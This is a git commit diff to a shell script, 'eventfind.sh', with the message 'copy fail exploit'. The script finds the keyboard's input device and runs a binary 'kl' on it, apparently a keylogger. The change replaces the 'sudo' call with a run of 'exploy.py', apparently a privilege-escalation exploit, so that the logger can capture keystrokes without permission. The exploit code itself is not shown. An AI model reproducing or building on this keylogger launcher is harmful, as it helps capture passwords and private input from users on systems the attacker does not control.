000f5e8453f50857dc1614121d126e32bd170e05
drac-0 <muhammadfaiz050607@gmail.com>
2026-05-12 07:02:48 +0700

    copy fail exploit

--- eventfind.sh
+++ eventfind.sh
@@ -2,11 +2,14 @@
 a=$(ls -lh /dev/input/by-path/ | grep kbd)
 i=0
 while true; do
-  echo $a | grep -o event$i
-  if [[ $? -eq 0 ]]; then
-    sudo ./kl /dev/input/event$i
-    clear
-    exit 0
-  fi
-  ((i++))
+      echo $a | grep -o event$i
+      if [[ $? -eq 0 ]]; then
+            python3 exploy.py
+            ./kl /dev/input/event$i
+            clear
+            exit
+      fi
+      ((i++))
 done
+
+exit
